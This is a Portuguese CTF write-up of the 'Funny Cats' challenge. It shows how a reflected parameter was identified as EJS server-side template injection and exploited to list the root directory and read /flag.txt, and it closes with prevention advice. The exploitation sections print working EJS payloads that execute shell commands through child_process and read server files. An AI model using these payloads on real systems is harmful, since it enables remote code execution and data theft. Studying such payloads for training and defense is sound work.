
# 🛡️ Write-up CTF: Template Injection do Chapéu de Palha Hacker

## 🐱 Desafio: Funny Cats

> *"Esses gatos escondem algo... Descubra o que é!"*

🔎 **Objetivo:** Encontrar a flag no caminho `/flag.txt`.  
🌐 **Link de Acesso:** [funny-cats.chapeudepalhahacker.club](https://funny-cats.chapeudepalhahacker.club/)  
📁 **Dica:** A flag está escondida nos cantos mais inesperados... ou nem tanto.

---

## 📌 Contexto Rápido

| Item                    | Detalhe                                                                 |
|-------------------------|-------------------------------------------------------------------------|
| 🎯 Nome do Desafio       | **Funny Cats**                                                         |
| 🧩 Tema                  | **Template Injection (EJS)**                                           |
| 📍 Local da Flag         | `/flag.txt`                                                            |
| 🌐 URL                  | [https://funny-cats.chapeudepalhahacker.club/](https://funny-cats.chapeudepalhahacker.club/) |
| 💡 Observação Inicial    | O site reflete entradas do parâmetro `name` diretamente no HTML.        |

---

## 🧠 1. Introdução à Vulnerabilidade: Template Injection

### 📚 O que é Template Injection?

**Template Injection** é uma falha que permite a execução de código malicioso ao injetar entradas diretamente em sistemas de template como **EJS**, **Jinja2**, **Twig**, entre outros.

Quando o input do usuário não é tratado corretamente, é possível manipular a lógica do template, acessar funções internas e até executar comandos no servidor.

Exemplo em EJS:

```ejs
<%= 7 * 7 %>  // Renderiza: 49
```

Possível payload malicioso:

```ejs
<%= require('child_process').execSync('id').toString() %>
```

Se o servidor processar isso, o comando `id` será executado diretamente.

---

## 🔍 2. Análise do Desafio

### 🧪 Testes Iniciais

Navegando até a URL:

```
https://funny-cats.chapeudepalhahacker.club/gato?name=alfredo
```

Encontrei no código-fonte HTML:

```html
<!-- alfredo -->
```

Alterando o parâmetro:

```
gato?name=teste123
```

Resultado:

```html
<!-- teste123 -->
```

🚨 **Entrada refletida diretamente em HTML = potencial vulnerabilidade.**

### 🔬 Teste de Template

Enviei:

```ejs
<%= 2 * 2 %>
```

E recebi:

```html
<!-- 4 -->
```

✅ **Confirmação:** Template Injection detectado.  
🧠 **Motor utilizado:** Provavelmente **EJS** (Embedded JavaScript Templates).

---

## ⚔️ 3. Exploração da Vulnerabilidade

### 🔹 Etapa 1: Execução Remota de Código (RCE)

Payload:

```ejs
<%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls /").toString() %>
```

📋 **O que faz?**
- Acessa o objeto `process` via Function constructor.
- Usa `require('child_process')` para executar comandos.
- Executa `ls /` para listar o diretório raiz.

📥 **Resultado:**  
A resposta exibiu os diretórios e arquivos do sistema, incluindo `flag.txt`.

---

### 🔹 Etapa 2: Lendo a Flag

Payload:

```ejs
<%= global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8') %>
```

📥 **Resultado final:**  

```html
<!-- flag{w3_l0v3_c4t5} -->
```

🏁 **Flag capturada com sucesso!**

---

## 🧩 4. Lições Aprendidas

### ✔️ Boas Práticas

- **Validação e escape de entrada:** Nunca insira dados do usuário diretamente em templates.
- **Menor privilégio:** Rode o servidor com permissões mínimas.
- **Evite exposição de objetos globais:** Como `require`, `process` e afins.
- **Utilize ambientes sandboxed:** Sempre que possível.

### 🔐 Como prevenir Template Injection?

| Prática                            | Descrição                                                                 |
|------------------------------------|---------------------------------------------------------------------------|
| 🧼 **Sanitização de entrada**        | Escapar caracteres especiais e remover trechos perigosos.                 |
| 🛑 **Evite lógica dinâmica com input** | Não use diretamente dados do usuário na lógica de template.               |
| 🔒 **Restrição do ambiente de execução** | Use sandbox ou limitações no acesso a objetos como `require`, `process`.  |
| 🧱 **Use templates seguros**         | Motores de template com proteções por padrão são preferíveis.             |

---

## 🏁 Conclusão

Esse desafio mostrou como uma simples reflexão de parâmetro pode evoluir para execução de código remoto — tudo devido à falta de tratamento adequado em um motor de template.

🔁 **Resumo da exploração:**
1. Identifiquei o reflexo no HTML.
2. Confirmei que era um motor de template (EJS).
3. Usei payloads para explorar o sistema e capturar a flag.

⚠️ **Lembre-se:** vulnerabilidades como essa podem comprometer um sistema inteiro. Desenvolvedores devem sempre validar inputs, aplicar o princípio de menor privilégio e manter suas dependências atualizadas.

---

🧠 **Desafio vencido!**
